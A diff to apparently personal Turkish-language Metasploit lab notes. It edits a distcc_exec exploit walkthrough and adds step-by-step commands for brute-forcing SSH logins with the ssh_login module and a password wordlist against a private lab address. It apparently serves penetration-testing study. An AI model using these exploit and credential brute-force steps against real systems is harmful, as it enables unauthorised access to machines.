@@ -187,7 +187,7 @@ msf6> ~ use exploit(unix/misc/distcc_exec) //bu kısım search sonrası seçilir
 
 msf6> exploit(unix/misc/distcc_exec)~ show payloads //komutu, seçili exploit ile uyumlu payload’ları listeler.Exploit için gerekli payload’lar.Reverse olanlar hedef makinenin sana geri bağlantı kurduğu payload’lardır.İlk bunları dene
 
-msf6> exploit(unix/misc/distcc_exec)~ set payload 5 //hepsini olana kadar dene ve devamında
+msf6> exploit(unix/misc/distcc_exec)~ set payload 5 //hepsini olana kadar dene 1-2-4-5... ve devamında
 
 > show options
 > exploit -j -z
@@ -195,3 +195,19 @@ msf6> exploit(unix/misc/distcc_exec)~ set payload 5 //hepsini olana kadar dene v
 > sessions 1
 
 diye devam et
+
+**_SSH-Login Hackleme _**
+
+~msfconsole
+msf6> ~search ssh
+msf6> ~use auxiliary/sc..../ssh_login //login olanı cp
+msf6 auxiliary (sc..../ssh_login)> ~show options //required yes olanlar zorunlu
+msf6 auxiliary (sc..../ssh_login)> ~ set RHOSTS 10.0.2.17
+msf6 auxiliary (sc..../ssh_login)> ~set VERBOSE yes //çıktı yapsın
+msf6 auxiliary (sc..../ssh_login)> ~set USERNAME msfadmin //bunu herhangi bir şekilde görmüşsen veya biliyorsan gir ,ya username ya password biliniyorsa diğerini bulmak için gir
+msf6 auxiliary (sc..../ssh_login)> ~set PASS_FILE /home/kali/sshpassword.txt // pass_file veya userpass_file wordlist bul veya yap ve gir. kendisi doğru olanı bulacak
+msf6 auxiliary (sc..../ssh_login)> ~show options //son kontroller
+msf6 auxiliary (sc..../ssh_login)> ~exploit //hacklemeye başlar
+msf6 auxiliary (sc..../ssh_login)> ~sessions -l
+msf6 auxiliary (sc..../ssh_login)> ~sessions 1
+uname -a ...
